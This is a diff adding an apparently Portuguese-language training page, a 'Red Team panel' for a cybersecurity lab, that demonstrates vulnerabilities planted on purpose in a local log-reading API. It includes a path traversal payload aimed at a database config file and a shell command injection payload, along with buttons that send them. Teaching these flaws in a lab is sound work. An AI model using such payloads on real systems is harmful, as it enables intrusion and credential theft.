@@ -1,0 +1,132 @@
+<!doctype html>
+<html lang="pt-BR" data-theme="light">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Painel Red Team — Logs das UPVs (Combio)</title>
+<style>
+  :root {
+    --bg: #f5f3ee; --card: #ffffff; --ink: #1c2b24; --muted: #6b7a70;
+    --line: #e2ddd2; --ambar: #c77d29; --verde: #2f7d5b; --vermelho: #c0392b;
+    --code-bg: #14271f; --code-ink: #e8e8e8;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+         background: var(--bg); color: var(--ink); line-height: 1.5; }
+  header { padding: 24px 20px 18px; border-bottom: 1px solid var(--line); background: var(--card); }
+  .wrap { max-width: 920px; margin: 0 auto; padding: 0 20px; }
+  h1 { margin: 0; font-size: 20px; }
+  .sub { color: var(--muted); font-size: 13px; margin-top: 4px; }
+  .aviso { background: #fbeee0; border: 1px solid #eecfa6; color: #8a5a1a;
+           border-radius: 10px; padding: 10px 14px; font-size: 13px; margin: 16px 0; }
+  main { padding: 24px 0 60px; }
+  .card { background: var(--card); border: 1px solid var(--line); border-radius: 12px;
+          padding: 18px; margin-bottom: 16px; }
+  .card h2 { margin: 0 0 4px; font-size: 16px; }
+  .card .owasp { font-size: 12px; font-weight: 600; letter-spacing: .4px; }
+  .owasp.red { color: var(--vermelho); } .owasp.amb { color: var(--ambar); }
+  .card p { margin: 6px 0 12px; font-size: 13px; color: var(--muted); }
+  .row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+  input { flex: 1; min-width: 180px; padding: 9px 11px; border: 1px solid var(--line);
+          border-radius: 8px; font-family: ui-monospace, SFMono-Regular, Consolas, monospace; font-size: 13px; }
+  button { border: none; border-radius: 8px; padding: 9px 16px; font-size: 13px; font-weight: 600;
+           cursor: pointer; background: var(--ink); color: #fff; }
+  button.atk { background: var(--vermelho); }
+  button.ok { background: var(--verde); }
+  pre { background: var(--code-bg); color: var(--code-ink); border-radius: 8px; padding: 12px 14px;
+        font-size: 12.5px; overflow-x: auto; margin: 12px 0 0; white-space: pre-wrap; word-break: break-word;
+        min-height: 20px; max-height: 320px; overflow-y: auto; }
+  .flag { display: inline-block; background: #fdecea; color: var(--vermelho); border: 1px solid #f3c6c0;
+          border-radius: 6px; padding: 1px 7px; font-size: 11px; font-weight: 700; margin-left: 6px; }
+  .port { font-family: ui-monospace, monospace; }
+  footer { color: var(--muted); font-size: 12px; text-align: center; padding: 24px; }
+</style>
+</head>
+<body>
+<header>
+  <div class="wrap">
+    <h1>🔴 Painel Red Team — Logs das UPVs</h1>
+    <div class="sub">Encontro 4 · CyberSecurity · sistema de manutenção da Combio — <b>ambiente de laboratório</b></div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="aviso">
+    ⚠️ Esta tela existe para <b>demonstrar vulnerabilidades plantadas de propósito</b>. Ela chama
+    os endpoints do módulo <code>logs</code> e mostra a resposta crua. Nada aqui é código de referência.
+    API em <span class="port" id="apiBase">http://localhost:3000</span>.
+  </div>
+</div>
+
+<main class="wrap">
+
+  <!-- 1. leitura normal -->
+  <div class="card">
+    <div class="owasp amb">A09 · LGPD (art. 5º)</div>
+    <h2>1. Ler o log do dia <span class="flag">dado pessoal exposto</span></h2>
+    <p>Leitura "normal". Repare no CPF do operador e no RG do técnico terceiro — servidos sem autenticação.</p>
+    <div class="row">
+      <input id="arq" value="2026-10-28.log" />
+      <button class="ok" onclick="lerLog()">Ler log</button>
+    </div>
+    <pre id="out1">—</pre>
+  </div>
+
+  <!-- 2. path traversal -->
+  <div class="card">
+    <div class="owasp red">A01 + A05 · Broken Access Control / Path Traversal</div>
+    <h2>2. Vazar a credencial do banco <span class="flag">path traversal</span></h2>
+    <p>O campo <code>arquivo</code> não é validado. Subindo dois níveis, o endpoint lê um arquivo do código-fonte.</p>
+    <div class="row">
+      <input id="arqAtk" value="../../src/config/database.config.ts" />
+      <button class="atk" onclick="traversal()">Atacar</button>
+    </div>
+    <pre id="out2">—</pre>
+  </div>
+
+  <!-- 3. command injection -->
+  <div class="card">
+    <div class="owasp red">A05 · OS Command Injection</div>
+    <h2>3. Rodar comando no servidor <span class="flag">RCE</span></h2>
+    <p>O termo de busca entra direto no shell. O payload abaixo injeta o comando <code>id</code>.</p>
+    <div class="row">
+      <input id="termo" value='x"; id; echo "' />
+      <button class="atk" onclick="injection()">Atacar</button>
+    </div>
+    <pre id="out3">—</pre>
+  </div>
+
+</main>
+
+<footer>Hcode × Combio · Encontro 4 · uso exclusivo em laboratório</footer>
+
+<script>
+  const base = location.origin; // mesma origem onde o painel foi servido (respeita PORT)
+  document.getElementById('apiBase').textContent = base;
+
+  async function chamar(url, alvo) {
+    const el = document.getElementById(alvo);
+    el.textContent = 'chamando ' + url + ' ...';
+    try {
+      const r = await fetch(url);
+      const txt = await r.text();
+      el.textContent = '[HTTP ' + r.status + ']\n\n' + txt;
+    } catch (e) {
+      el.textContent = 'Falha: ' + e.message + '\n(o backend está rodando?)';
+    }
+  }
+  function lerLog() {
+    const a = encodeURIComponent(document.getElementById('arq').value);
+    chamar(base + '/logs/upv/1?arquivo=' + a, 'out1');
+  }
+  function traversal() {
+    const a = encodeURIComponent(document.getElementById('arqAtk').value);
+    chamar(base + '/logs/upv/1?arquivo=' + a, 'out2');
+  }
+  function injection() {
+    const t = encodeURIComponent(document.getElementById('termo').value);
+    chamar(base + '/logs/grep?upvId=1&termo=' + t, 'out3');
+  }
+</script>
+</body>
+</html>
